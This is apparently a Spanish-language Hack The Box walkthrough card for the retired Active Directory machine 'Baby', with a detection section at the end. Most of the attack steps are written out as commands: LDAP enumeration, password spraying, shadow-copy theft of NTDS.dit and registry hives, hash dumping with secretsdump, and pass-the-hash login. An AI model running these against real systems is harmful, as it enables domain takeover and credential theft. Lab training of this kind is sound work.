---
machine: Baby
os: Windows
difficulty: Easy
platform: Hack The Box
category: Active Directory
state: Retired
pwned: false
tags: [windows, active-directory, ldap, backup-operators, sebackupprivilege, ntds]
---

# Baby — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; no jugada en este perfil. Sin credenciales ni flags reales.

## Resumen

Dominio Active Directory con un controlador expuesto. La enumeración LDAP revela una credencial por defecto que se reutiliza en otra cuenta; esa cuenta tiene acceso WinRM. La escalada abusa de `Backup Operators`/`SeBackupPrivilege` para copiar `NTDS.dit` y las colmenas del sistema, volcar hashes de dominio y reutilizar el hash de Administrator.

## Enumeración

```bash
nmap -p- --min-rate 5000 -T4 <IP>
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985 -sCV <IP>
```

Los puertos habituales de DC (DNS, Kerberos, LDAP, SMB, WinRM) confirman el rol. Se añade el dominio y el host a `/etc/hosts`.

```bash
netexec smb <IP> -u '' -p '' --shares
netexec ldap <IP> -u '' -p '' --query '(objectClass=*)' description
ldapsearch -x -H ldap://<IP> -b 'DC=baby,DC=vl' '(objectClass=user)' description
```

La credencial aparece en un atributo descriptivo de un usuario. Se prueba contra el resto de cuentas con un spray controlado:

```bash
netexec smb <IP> -u users.txt -p '<PASSWORD>' --continue-on-success
netexec winrm <IP> -u <USER> -p '<PASSWORD>'
```

## Acceso inicial

```bash
evil-winrm -i <IP> -u <USER> -p '<PASSWORD>'
```

La cuenta pertenece a `Backup Operators` o tiene la capacidad equivalente. Se confirma con:

```powershell
whoami /groups
whoami /priv
```

## Escalada

`SeBackupPrivilege` permite leer archivos ignorando las ACL. Se crea un volumen sombra y se copian `NTDS.dit` y las colmenas:

```text
diskshadow.exe /s backup.txt
```

```text
set context persistent nowriters
add volume C: alias htb
create
expose %htb% Z:
```

```powershell
robocopy /b Z:\Windows\NTDS . NTDS.dit
robocopy /b Z:\Windows\System32\config . SYSTEM
robocopy /b Z:\Windows\System32\config . SECURITY
```

En el host de análisis:

```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM -security SECURITY LOCAL
```

El volcado incluye el hash NTLM de Administrator. Se reutiliza para WinRM o SMB:

```bash
netexec winrm <IP> -u Administrator -H '<NTLM_HASH>'
evil-winrm -i <IP> -u Administrator -H '<NTLM_HASH>'
```

## Flags

- `user.txt`: `<USER_FLAG>`
- `root.txt`: `<ROOT_FLAG>`

No se publican valores reales.

## Lecciones

- Un atributo LDAP descriptivo puede filtrar una credencial válida.
- El spray debe ser lento y con una sola contraseña para no bloquear cuentas.
- `Backup Operators` es una vía directa a `NTDS.dit`; no hace falta DCSync.
- Copiar las tres colmenas evita depender de un único fichero.

## Detección y mitigación

- Auditar descripciones y campos `info` de usuarios; no guardar secretos en LDAP.
- Alertar de autenticaciones WinRM desde cuentas de servicio o recién creadas.
- Monitorizar `SeBackupPrivilege`, `diskshadow`, `robocopy /b` y acceso a `NTDS.dit`.
- Restringir `Backup Operators` y rotar credenciales tras un incidente.

## Referencias

- <https://0xdf.gitlab.io/2025/09/19/htb-baby.html>
- <https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-default-user-accounts>
- <https://attack.mitre.org/techniques/T1003/003/>
